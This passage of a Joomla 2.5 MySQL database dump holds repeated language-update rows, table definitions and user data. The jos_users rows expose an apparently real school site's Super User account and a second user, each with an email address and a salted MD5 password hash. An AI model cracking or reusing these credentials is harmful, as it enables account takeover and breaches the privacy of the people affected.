(1207, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1208, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1209, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1210, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1211, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1212, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1213, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1214, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1215, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1216, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(1217, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1218, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1219, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1220, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1221, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1222, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1223, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1224, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(1225, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1226, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1227, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1228, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1229, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1230, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1231, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1232, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1233, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1234, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1235, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1236, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1237, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1238, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1239, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1240, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1241, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1242, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1243, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1244, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1245, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1246, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1247, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1248, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1249, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1250, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1251, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1252, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1253, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1254, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1255, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(1256, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1257, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1258, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1259, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1260, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1261, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1262, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1263, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(1264, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1265, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1266, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1267, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1268, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1269, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1270, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1271, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1272, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1273, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1274, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1275, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1276, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1277, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1278, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1279, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1280, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1281, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1282, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1283, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1284, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1285, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1286, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1287, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1288, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1289, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1290, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1291, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1292, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1293, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1294, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(1295, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1296, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1297, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1298, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1299, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1300, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1301, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1302, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(1303, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(1304, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(1305, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(1306, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(1307, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(1308, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(1309, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(1310, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(1311, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1312, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1313, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1314, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1315, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1316, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1317, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1318, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1319, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1320, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1321, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1322, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1323, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1324, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1325, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1326, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1327, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1328, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1329, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1330, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1331, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', '');

-- --------------------------------------------------------

--
-- Table structure for table `jos_update_categories`
--

CREATE TABLE IF NOT EXISTS `jos_update_categories` (
  `categoryid` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) DEFAULT '',
  `description` text NOT NULL,
  `parent` int(11) DEFAULT '0',
  `updatesite` int(11) DEFAULT '0',
  PRIMARY KEY (`categoryid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='Update Categories' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_update_sites`
--

CREATE TABLE IF NOT EXISTS `jos_update_sites` (
  `update_site_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT '',
  `type` varchar(20) DEFAULT '',
  `location` text NOT NULL,
  `enabled` int(11) DEFAULT '0',
  `last_check_timestamp` bigint(20) DEFAULT '0',
  PRIMARY KEY (`update_site_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='Update Sites' AUTO_INCREMENT=5 ;

--
-- Dumping data for table `jos_update_sites`
--

INSERT INTO `jos_update_sites` (`update_site_id`, `name`, `type`, `location`, `enabled`, `last_check_timestamp`) VALUES
(1, 'Joomla Core', 'collection', 'http://update.joomla.org/core/list.xml', 1, 1466678184),
(2, 'Joomla Extension Directory', 'collection', 'http://update.joomla.org/jed/list.xml', 1, 1466678184),
(3, 'Accredited Joomla! Translations', 'collection', 'http://update.joomla.org/language/translationlist.xml', 1, 1466678184),
(4, 'Joomla.Rjews.Net', 'extension', 'http://joomla.rjews.net/extensions.xml', 0, 1459506222);

-- --------------------------------------------------------

--
-- Table structure for table `jos_update_sites_extensions`
--

CREATE TABLE IF NOT EXISTS `jos_update_sites_extensions` (
  `update_site_id` int(11) NOT NULL DEFAULT '0',
  `extension_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`update_site_id`,`extension_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Links extensions to update sites';

--
-- Dumping data for table `jos_update_sites_extensions`
--

INSERT INTO `jos_update_sites_extensions` (`update_site_id`, `extension_id`) VALUES
(1, 700),
(2, 700),
(3, 10004),
(4, 10005);

-- --------------------------------------------------------

--
-- Table structure for table `jos_usergroups`
--

CREATE TABLE IF NOT EXISTS `jos_usergroups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Adjacency List Reference Id',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `title` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_usergroup_parent_title_lookup` (`parent_id`,`title`),
  KEY `idx_usergroup_title_lookup` (`title`),
  KEY `idx_usergroup_adjacency_lookup` (`parent_id`),
  KEY `idx_usergroup_nested_set_lookup` (`lft`,`rgt`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `jos_usergroups`
--

INSERT INTO `jos_usergroups` (`id`, `parent_id`, `lft`, `rgt`, `title`) VALUES
(1, 0, 1, 20, 'Public'),
(2, 1, 6, 17, 'Enregistré'),
(3, 2, 7, 14, 'Auteur'),
(4, 3, 8, 11, 'Rédacteur'),
(5, 4, 9, 10, 'Éditeur'),
(6, 1, 2, 5, 'Gestionnaire'),
(7, 6, 3, 4, 'Administrateur'),
(8, 1, 18, 19, 'Super Utilisateur');

-- --------------------------------------------------------

--
-- Table structure for table `jos_users`
--

CREATE TABLE IF NOT EXISTS `jos_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `username` varchar(150) NOT NULL DEFAULT '',
  `email` varchar(100) NOT NULL DEFAULT '',
  `password` varchar(100) NOT NULL DEFAULT '',
  `usertype` varchar(25) NOT NULL DEFAULT '',
  `block` tinyint(4) NOT NULL DEFAULT '0',
  `sendEmail` tinyint(4) DEFAULT '0',
  `registerDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `lastvisitDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `activation` varchar(100) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  `lastResetTime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT 'Date of last password reset',
  `resetCount` int(11) NOT NULL DEFAULT '0' COMMENT 'Count of password resets since lastResetTime',
  PRIMARY KEY (`id`),
  KEY `usertype` (`usertype`),
  KEY `idx_name` (`name`),
  KEY `idx_block` (`block`),
  KEY `username` (`username`),
  KEY `email` (`email`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=392 ;

--
-- Dumping data for table `jos_users`
--

INSERT INTO `jos_users` (`id`, `name`, `username`, `email`, `password`, `usertype`, `block`, `sendEmail`, `registerDate`, `lastvisitDate`, `activation`, `params`, `lastResetTime`, `resetCount`) VALUES
(390, 'Super User', 'admin', 'admin@lyceemaximiliensorre.fr', '1f2e66daafece0da08c37d55be1b2e53:Bt0gaUur2rlWAUXTqD0SHtt85225UH0r', 'deprecated', 0, 1, '2012-07-08 16:26:39', '2016-06-23 10:36:19', '0', '{"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""}', '0000-00-00 00:00:00', 0),
(391, 'TheMr', 'TheMr', 'themr@viveom.com', 'c514d8161678908133310fa58d7bf69a:uBbODVCATaytwgouEIn96O7DfQQ2fZYB', '', 0, 0, '2013-11-09 22:25:15', '0000-00-00 00:00:00', '', '{}', '0000-00-00 00:00:00', 0);

-- --------------------------------------------------------

--
-- Table structure for table `jos_user_notes`
--

CREATE TABLE IF NOT EXISTS `jos_user_notes` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `subject` varchar(100) NOT NULL DEFAULT '',
  `body` text NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_user_id` int(10) unsigned NOT NULL,
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `review_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_category_id` (`catid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_user_profiles`
--

CREATE TABLE IF NOT EXISTS `jos_user_profiles` (
  `user_id` int(11) NOT NULL,
  `profile_key` varchar(100) NOT NULL,
  `profile_value` varchar(255) NOT NULL,
  `ordering` int(11) NOT NULL DEFAULT '0',
  UNIQUE KEY `idx_user_id_profile_key` (`user_id`,`profile_key`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='Simple user profile storage table';

-- --------------------------------------------------------

--
-- Table structure for table `jos_user_usergroup_map`
--

CREATE TABLE IF NOT EXISTS `jos_user_usergroup_map` (
  `user_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Foreign Key to #__users.id',
  `group_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Foreign Key to #__usergroups.id',
  PRIMARY KEY (`user_id`,`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `jos_user_usergroup_map`
--

INSERT INTO `jos_user_usergroup_map` (`user_id`, `group_id`) VALUES
(390, 8),
(391, 2);

-- --------------------------------------------------------

--
-- Table structure for table `jos_viewlevels`
--

CREATE TABLE IF NOT EXISTS `jos_viewlevels` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `title` varchar(100) NOT NULL DEFAULT '',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `rules` varchar(5120) NOT NULL COMMENT 'JSON encoded access control.',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_assetgroup_title_lookup` (`title`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `jos_viewlevels`
--

